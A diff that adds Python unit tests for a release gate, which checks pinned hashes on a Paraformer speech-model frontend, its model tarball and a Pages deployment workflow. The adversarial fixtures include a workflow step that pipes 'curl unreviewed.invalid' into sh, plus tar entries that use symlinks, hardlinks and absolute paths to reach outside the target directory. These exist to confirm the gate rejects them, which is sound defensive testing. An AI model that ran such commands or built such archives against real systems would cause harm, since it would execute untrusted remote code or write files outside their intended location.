@@ -12,6 +12,7 @@ import shutil
 import struct
 import subprocess
 import tempfile
+import tarfile
 import unittest
 from unittest import mock
 import zipfile
@@ -2293,6 +2294,427 @@ class R25CloudUpdateTests(unittest.TestCase):
             with mock.patch.object(gate, 'stage_r25', corrupt_older):
                 with self.assertRaisesRegex(gate.GateFailure, 'older Pages resource'):
                     self.verify(self.registration_encoded, self.name_entry_encoded)
+
+
+class R24ParaformerFrontendAndWorkflowTests(unittest.TestCase):
+    """Small adversarial fixtures; model and frontend pins remain independent."""
+
+    def setUp(self):
+        self.upstream = {
+            'sherpa-onnx-asr.js': b'upstream-api',
+            'sherpa-onnx-wasm-main-vad-asr.js': b'upstream-runtime',
+            'sherpa-onnx-wasm-main-vad-asr.wasm': b'\x00asm-fixture',
+            'sherpa-onnx-wasm-main-vad-asr.data': b'upstream-model-data',
+        }
+        self.model_pins = {name: (len(data), gate.sha256(data))
+                           for name, data in self.upstream.items()}
+        self.resources = {
+            'index.html': b'<!doctype html><title>Paraformer fixture</title>',
+            'app.js': b'const fixture = "local inference";',
+            'vendor/paraformer/manifest.json': b'{"fixed-model-manifest":true}',
+        }
+        self.version = 'r24-paraformer-fixture-v1'
+        self.resources = self.with_manifest(self.resources)
+        self.constants = mock.patch.multiple(
+            gate,
+            R24_PF_MODEL_FILES=self.model_pins,
+            R24_PF_FRONTEND_FILES=frozenset(self.resources),
+            R24_PF_MODEL_MANIFEST_SHA=gate.sha256(self.resources['vendor/paraformer/manifest.json']),
+            R24_PF_VERSION=self.version,
+        )
+        self.constants.start()
+        self.addCleanup(self.constants.stop)
+        self.before = 'name: unchanged Pages fixture\n' + gate.LAB_ANCHOR + 'tail: unchanged\n'
+        self.workflow_pin = mock.patch.object(gate, 'R24_PF_BASE_WORKFLOW_SHA', gate.sha256(self.before.encode()))
+        self.workflow_pin.start()
+        self.addCleanup(self.workflow_pin.stop)
+        self.after = self.before.replace(gate.LAB_ANCHOR,
+                                         gate.r24_pf_stage_step() + gate.LAB_ANCHOR, 1)
+
+    def with_manifest(self, resources):
+        result = dict(resources)
+        coverage = {name: gate.sha256(data) for name, data in result.items()
+                    if name != 'static-manifest.json'}
+        coverage.update({'vendor/paraformer/' + name: pin
+                         for name, (_, pin) in self.model_pins.items()})
+        result['static-manifest.json'] = json.dumps(
+            {'version': self.version, 'files': coverage}, sort_keys=True).encode()
+        return result
+
+    def zipped(self, resources):
+        out = io.BytesIO()
+        with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as archive:
+            for name, data in resources.items():
+                archive.writestr(name, data)
+        return out.getvalue()
+
+    def inspect(self, resources, repin_zip=True):
+        raw = self.zipped(resources)
+        if repin_zip:
+            with mock.patch.object(gate, 'R24_PF_SITE_SHA', gate.sha256(raw)):
+                return gate.r24_pf_frontend(raw)
+        return gate.r24_pf_frontend(raw)
+
+    def manifest_change(self, change):
+        resources = dict(self.resources)
+        manifest = json.loads(resources['static-manifest.json'])
+        change(manifest)
+        resources['static-manifest.json'] = json.dumps(manifest).encode()
+        return resources
+
+    def test_paraformer_frontend_accepts_exact_content_and_complete_model_coverage(self):
+        self.assertEqual(self.inspect(self.resources), self.resources)
+
+    def test_paraformer_frontend_rejects_unpinned_zip_even_when_content_is_valid(self):
+        with mock.patch.object(gate, 'R24_PF_SITE_SHA', '0' * 64):
+            with self.assertRaises(gate.GateFailure):
+                self.inspect(self.resources, repin_zip=False)
+
+    def test_paraformer_frontend_rejects_extra_and_missing_resource_even_if_zip_repinned(self):
+        variants = []
+        extra = dict(self.resources)
+        extra['backend/private-data.json'] = b'{}'
+        variants.append(self.with_manifest(extra))
+        missing = dict(self.resources)
+        del missing['app.js']
+        variants.append(self.with_manifest(missing))
+        for resources in variants:
+            with self.subTest(files=sorted(resources)):
+                with self.assertRaises(gate.GateFailure):
+                    self.inspect(resources)
+
+    def test_paraformer_frontend_rejects_changed_model_manifest_even_when_outer_manifest_repinned(self):
+        resources = dict(self.resources)
+        resources['vendor/paraformer/manifest.json'] = b'{"different-model":true}'
+        with self.assertRaises(gate.GateFailure):
+            self.inspect(self.with_manifest(resources))
+
+    def test_paraformer_frontend_rejects_changed_app_with_stale_manifest(self):
+        resources = dict(self.resources)
+        resources['app.js'] += b' changed'
+        with self.assertRaises(gate.GateFailure):
+            self.inspect(resources)
+
+    def test_paraformer_frontend_rejects_omitted_model_resource_coverage(self):
+        for name in self.upstream:
+            resources = self.manifest_change(
+                lambda m, name=name: m['files'].pop('vendor/paraformer/' + name))
+            with self.subTest(model=name):
+                with self.assertRaises(gate.GateFailure):
+                    self.inspect(resources)
+
+    def test_paraformer_frontend_rejects_model_hash_changed_to_another_release(self):
+        for name in self.upstream:
+            resources = self.manifest_change(
+                lambda m, name=name: m['files'].__setitem__('vendor/paraformer/' + name, 'f' * 64))
+            with self.subTest(model=name):
+                with self.assertRaises(gate.GateFailure):
+                    self.inspect(resources)
+
+    def test_paraformer_frontend_rejects_unlisted_manifest_resource_and_self_coverage(self):
+        for name in ('backend/secrets.json', 'static-manifest.json'):
+            resources = self.manifest_change(
+                lambda m, name=name: m['files'].__setitem__(name, 'a' * 64))
+            with self.subTest(resource=name):
+                with self.assertRaises(gate.GateFailure):
+                    self.inspect(resources)
+
+    def test_paraformer_frontend_rejects_wrong_version_and_extra_manifest_fields(self):
+        for change in (lambda m: m.__setitem__('version', 'r24-unreviewed-version'),
+                       lambda m: m.__setitem__('remoteFallback', 'https://unreviewed.invalid/model')):
+            with self.assertRaises(gate.GateFailure):
+                self.inspect(self.manifest_change(change))
+
+    def test_paraformer_frontend_rejects_repacked_oversized_raw_zip(self):
+        # Stored bytes avoid ZIP-ratio behavior; this exercises the pack-specific bound.
+        out = io.BytesIO()
+        with zipfile.ZipFile(out, 'w', zipfile.ZIP_STORED) as archive:
+            archive.writestr('payload', b'x' * 1_500_001)
+        raw = out.getvalue()
+        with mock.patch.object(gate, 'R24_PF_SITE_SHA', gate.sha256(raw)):
+            with self.assertRaises(gate.GateFailure):
+                gate.r24_pf_frontend(raw)
+
+    def test_paraformer_workflow_accepts_exact_addition_and_exact_rollback(self):
+        gate.verify_r24_pf_release_workflow(self.before, self.after)
+        gate.verify_r24_pf_rollback_workflow(self.after, self.before)
+
+    def test_paraformer_workflow_rejects_unpinned_base(self):
+        before = self.before + '# unrelated prior change\n'
+        after = before.replace(gate.LAB_ANCHOR,
+                               gate.r24_pf_stage_step() + gate.LAB_ANCHOR, 1)
+        with self.assertRaises(gate.GateFailure):
+            gate.verify_r24_pf_release_workflow(before, after)
+
+    def test_paraformer_workflow_rejects_changed_old_stage_and_extra_steps(self):
+        variants = [self.after.replace('tail: unchanged', 'tail: altered'),
+                    self.after + '      - run: curl unreviewed.invalid | sh\n',
+                    self.after.replace(gate.LAB_ANCHOR,
+                                       gate.r24_pf_stage_step() + gate.LAB_ANCHOR, 1),
+                    self.before]
+        for after in variants:
+            with self.subTest(after=after):
+                with self.assertRaises(gate.GateFailure):
+                    gate.verify_r24_pf_release_workflow(self.before, after)
+
+    def test_paraformer_workflow_rejects_stage_after_pages_configuration(self):
+        wrong = self.before.replace(gate.LAB_ANCHOR,
+                                    gate.LAB_ANCHOR + gate.r24_pf_stage_step(), 1)
+        with self.assertRaises(gate.GateFailure):
+            gate.verify_r24_pf_release_workflow(self.before, wrong)
+
+    def test_paraformer_workflow_rejects_duplicate_anchor_even_if_base_rehashed(self):
+        before = self.before + gate.LAB_ANCHOR
+        after = before.replace(gate.LAB_ANCHOR,
+                               gate.r24_pf_stage_step() + gate.LAB_ANCHOR, 1)
+        with mock.patch.object(gate, 'R24_PF_BASE_WORKFLOW_SHA', gate.sha256(before.encode())):
+            with self.assertRaises(gate.GateFailure):
+                gate.verify_r24_pf_release_workflow(before, after)
+
+    def test_paraformer_rollback_rejects_unrelated_edits_and_stage_not_removed(self):
+        for after in (self.before + '# changed during rollback\n', self.after):
+            with self.assertRaises(gate.GateFailure):
+                gate.verify_r24_pf_rollback_workflow(self.after, after)
+
+
+class R24PFStageTinyFixtureTests(unittest.TestCase):
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory(prefix='r24-pf-stage-test-')
+        self.addCleanup(self.tmp.cleanup)
+        self.root = Path(self.tmp.name)
+        self.site = self.root / 'site'
+        self.site.mkdir()
+        self.old_files = {
+            'index.html': b'immutable historical root',
+            'tcl-v352-asr-r24-qa/app.js': b'immutable original R24',
+            'tcl-v352-asr-r25-qa/app.js': b'immutable original R25',
+        }
+        for name, content in self.old_files.items():
+            path = self.site / name
+            path.parent.mkdir(parents=True, exist_ok=True)
+            path.write_bytes(content)
+        self.app = self.root / 'reviewed-frontend.zip'
+        self.app.write_bytes(b'tiny frontend; separately validated by frontend tests')
+        self.resources = {
+            'index.html': b'<title>isolated candidate</title>',
+            'static-manifest.json': b'frontend validation is intentionally mocked',
+            'vendor/paraformer/NOTICE.md': b'component-specific license evidence',
+        }
+        self.model_bytes = {
+            'sherpa-onnx-asr.js': b'api bytes',
+            'sherpa-onnx-wasm-main-vad-asr.js': b'loader bytes',
+            'sherpa-onnx-wasm-main-vad-asr.wasm': b'\0asm tiny test bytes',
+            'sherpa-onnx-wasm-main-vad-asr.data': b'tiny non-model payload',
+        }
+        self.model_pins = {
+            name: (len(data), hashlib.sha256(data).hexdigest())
+            for name, data in self.model_bytes.items()
+        }
+        patcher = mock.patch.object(gate, 'R24_PF_MODEL_FILES', self.model_pins)
+        patcher.start()
+        self.addCleanup(patcher.stop)
+        patcher = mock.patch.object(gate, 'r24_pf_frontend', return_value=self.resources)
+        self.frontend = patcher.start()
+        self.addCleanup(patcher.stop)
+        self.archive = self.make_archive()
+        self.expected_archive_bytes = self.archive.read_bytes()
+
+    def make_archive(self, records=None, filename='model.tar.bz2'):
+        """Records are (relative-or-absolute-tar-name, bytes, tar type, linkname)."""
+        if records is None:
+            records = [(name, data, tarfile.REGTYPE, '')
+                       for name, data in self.model_bytes.items()]
+        output = self.root / filename
+        with tarfile.open(output, 'w:bz2', format=tarfile.GNU_FORMAT) as archive:
+            directory = tarfile.TarInfo(gate.R24_PF_MODEL_PREFIX.rstrip('/'))
+            directory.type = tarfile.DIRTYPE
+            directory.mtime = 0
+            archive.addfile(directory)
+            for name, data, kind, linkname in records:
+                # A leading slash denotes a deliberately unsafe root, not a
+                # filesystem destination. No archive is extracted by this helper.
+                full = name if name.startswith('/') else gate.R24_PF_MODEL_PREFIX + name
+                entry = tarfile.TarInfo(full)
+                entry.type = kind
+                entry.linkname = linkname
+                entry.mtime = 0
+                entry.size = len(data) if kind == tarfile.REGTYPE else 0
+                archive.addfile(entry, io.BytesIO(data) if kind == tarfile.REGTYPE else None)
+        return output
+
+    def pinned_stage(self, archive=None, site=None, pinned_raw=None):
+        archive = self.archive if archive is None else archive
+        site = self.site if site is None else site
+        raw = archive.read_bytes() if pinned_raw is None else pinned_raw
+        with mock.patch.multiple(
+            gate,
+            R24_PF_MODEL_ARCHIVE_BYTES=len(raw),
+            R24_PF_MODEL_ARCHIVE_SHA=hashlib.sha256(raw).hexdigest(),
+        ), contextlib.redirect_stdout(io.StringIO()):
+            return gate.stage_r24_pf(site, self.app, archive)
+
+    def assert_old_files_unchanged(self):
+        for name, content in self.old_files.items():
+            self.assertEqual((self.site / name).read_bytes(), content, name)
+
+    def assert_failed_without_new_route(self):
+        self.assert_old_files_unchanged()
+        target = self.site / gate.R24_PF_DEST
+        self.assertFalse(target.exists())
+        self.assertFalse(target.is_symlink())
+        self.assertFalse(list(self.root.glob('.r24-paraformer-*')),
+                         'failed staging must clean its temporary tree')
+
+    def test_r24_pf_stage_success_adds_only_exact_route_and_preserves_old_files(self):
+        before = gate.r25_tree_hashes(self.site)
+        result = self.pinned_stage()
+        expected = dict(self.resources)
+        expected.update({'vendor/paraformer/' + name: data
+                         for name, data in self.model_bytes.items()})
+        target = self.site / gate.R24_PF_DEST
+        actual = {p.relative_to(target).as_posix(): p.read_bytes()
+                  for p in target.rglob('*') if p.is_file()}
+        self.assertEqual(actual, expected)
+        self.assertEqual(result, {
+            'files': len(expected), 'old_assets_unchanged': len(before),
+            'total_assets': len(before) + len(expected),
+        })
+        self.frontend.assert_called_once_with(self.app.read_bytes())
+        self.assert_old_files_unchanged()
+        self.assertEqual(self.archive.read_bytes(), self.expected_archive_bytes)
+        self.assertFalse(list(self.root.glob('.r24-paraformer-*')))
+
+    def test_r24_pf_stage_rejects_same_size_archive_tamper_before_tar_open(self):
+        raw = bytearray(self.expected_archive_bytes)
+        raw[len(raw) // 2] ^= 1
+        self.archive.write_bytes(raw)
+        with mock.patch.object(gate.tarfile, 'open', side_effect=AssertionError('must verify pin first')):
+            with self.assertRaisesRegex(gate.GateFailure, 'archive hash'):
+                self.pinned_stage(pinned_raw=self.expected_archive_bytes)
+        self.assert_failed_without_new_route()
+
+    def test_r24_pf_stage_rejects_archive_size_tamper_before_tar_open(self):
+        self.archive.write_bytes(self.expected_archive_bytes + b'x')
+        with mock.patch.object(gate.tarfile, 'open', side_effect=AssertionError('must verify size first')):
+            with self.assertRaisesRegex(gate.GateFailure, 'archive size'):
+                self.pinned_stage(pinned_raw=self.expected_archive_bytes)
+        self.assert_failed_without_new_route()
+
+    def test_r24_pf_stage_rejects_member_hash_even_when_container_is_pinned(self):
+        records = [(name, data, tarfile.REGTYPE, '') for name, data in self.model_bytes.items()]
+        name, data, kind, linkname = records[-1]
+        records[-1] = (name, bytes([data[0] ^ 1]) + data[1:], kind, linkname)
+        archive = self.make_archive(records, 'different-member.tar.bz2')
+        with self.assertRaisesRegex(gate.GateFailure, 'member hash'):
+            self.pinned_stage(archive)
+        self.assert_failed_without_new_route()
+
+    def test_r24_pf_stage_rejects_bad_allowlisted_member_types_and_size(self):
+        normal = [(name, data, tarfile.REGTYPE, '') for name, data in self.model_bytes.items()]
+        first, original, _, _ = normal[0]
+        cases = {
+            'symlink': (first, b'', tarfile.SYMTYPE, '../../outside'),
+            'hardlink': (first, b'', tarfile.LNKTYPE, '../../outside'),
+            'directory': (first, b'', tarfile.DIRTYPE, ''),
+            'wrong-size': (first, original + b'x', tarfile.REGTYPE, ''),
+        }
+        for label, invalid in cases.items():
+            with self.subTest(case=label):
+                archive = self.make_archive([invalid, *normal[1:]], label + '.tar.bz2')
+                with self.assertRaisesRegex(gate.GateFailure, 'invalid upstream member'):
+                    self.pinned_stage(archive)
+                self.assert_failed_without_new_route()
+                self.assertFalse((self.root / 'outside').exists())
+
+    def test_r24_pf_stage_rejects_duplicate_missing_and_wrong_root_members(self):
+        normal = [(name, data, tarfile.REGTYPE, '') for name, data in self.model_bytes.items()]
+        cases = {
+            'duplicate': ([*normal, normal[0]], 'invalid upstream member'),
+            'missing': (normal[:-1], 'missing model resources'),
+            'wrong-root': ([('/outside', b'x', tarfile.REGTYPE, ''), *normal], 'root mismatch'),
+        }
+        for label, (records, message) in cases.items():
+            with self.subTest(case=label):
+                archive = self.make_archive(records, label + '.tar.bz2')
+                with self.assertRaisesRegex(gate.GateFailure, message):
+                    self.pinned_stage(archive)
+                self.assert_failed_without_new_route()
+
+    def test_r24_pf_stage_ignores_upstream_demo_files_without_staging_them(self):
+        normal = [(name, data, tarfile.REGTYPE, '') for name, data in self.model_bytes.items()]
+        archive = self.make_archive([*normal, ('demo.html', b'upstream demo omitted', tarfile.REGTYPE, '')])
+        self.pinned_stage(archive)
+        self.assertFalse((self.site / gate.R24_PF_DEST / 'vendor/paraformer/demo.html').exists())
+        self.assert_old_files_unchanged()
+
+    def test_r24_pf_stage_rejects_missing_file_or_symlink_site(self):
+        regular_file = self.root / 'not-directory'
+        regular_file.write_bytes(b'unchanged')
+        alias = self.root / 'site-alias'
+        alias.symlink_to(self.site, target_is_directory=True)
+        for label, site in [('missing', self.root / 'absent'), ('file', regular_file), ('symlink', alias)]:
+            with self.subTest(case=label):
+                with self.assertRaisesRegex(gate.GateFailure, 'site and a new route'):
+                    self.pinned_stage(site=site)
+                self.assert_failed_without_new_route()
+        self.assertEqual(regular_file.read_bytes(), b'unchanged')
+
+    def test_r24_pf_stage_rejects_existing_dest_file_directory_and_symlink(self):
+        target = self.site / gate.R24_PF_DEST
+        outside = self.root / 'outside'
+        outside.mkdir()
+        (outside / 'sentinel').write_bytes(b'outside must not change')
+        for label in ['file', 'directory', 'live-symlink', 'dangling-symlink']:
+            with self.subTest(case=label):
+                if label == 'file':
+                    target.write_bytes(b'preexisting route')
+                elif label == 'directory':
+                    target.mkdir()
+                    (target / 'sentinel').write_bytes(b'preexisting route')
+                else:
+                    target.symlink_to(outside if label == 'live-symlink' else self.root / 'missing', target_is_directory=True)
+                try:
+                    with self.assertRaisesRegex(gate.GateFailure, 'site and a new route'):
+                        self.pinned_stage()
+                    self.assert_old_files_unchanged()
+                    self.assertEqual((outside / 'sentinel').read_bytes(), b'outside must not change')
+                    if label == 'file':
+                        self.assertEqual(target.read_bytes(), b'preexisting route')
+                    elif label == 'directory':
+                        self.assertEqual((target / 'sentinel').read_bytes(), b'preexisting route')
+                    else:
+                        self.assertTrue(target.is_symlink())
+                finally:
+                    if target.is_symlink() or target.is_file():
+                        target.unlink()
+                    else:
+                        (target / 'sentinel').unlink()
+                        target.rmdir()
+
+    def test_r24_pf_stage_rejects_preexisting_symlink_in_protected_tree(self):
+        outside = self.root / 'external.txt'
+        outside.write_bytes(b'outside bytes')
+        alias = self.site / 'old-alias.txt'
+        alias.symlink_to(outside)
+        with self.assertRaisesRegex(gate.GateFailure, 'symlinks'):
+            self.pinned_stage()
+        self.assert_failed_without_new_route()
+        self.assertTrue(alias.is_symlink())
+        self.assertEqual(outside.read_bytes(), b'outside bytes')
+
+    def test_r24_pf_stage_refuses_commit_if_protected_tree_changes_mid_stage(self):
+        real_extract = gate.r24_pf_extract_model
+
+        def concurrent_change(archive, vendor):
+            real_extract(archive, vendor)
+            (self.site / 'index.html').write_bytes(b'simulated concurrent external update')
+
+        with mock.patch.object(gate, 'r24_pf_extract_model', side_effect=concurrent_change):
+            with self.assertRaisesRegex(gate.GateFailure, 'changed a protected Pages resource'):
+                self.pinned_stage()
+        self.assertFalse((self.site / gate.R24_PF_DEST).exists())
+        self.assertEqual((self.site / 'index.html').read_bytes(), b'simulated concurrent external update')
+        self.assertFalse(list(self.root.glob('.r24-paraformer-*')))
 
 
 if __name__=='__main__':
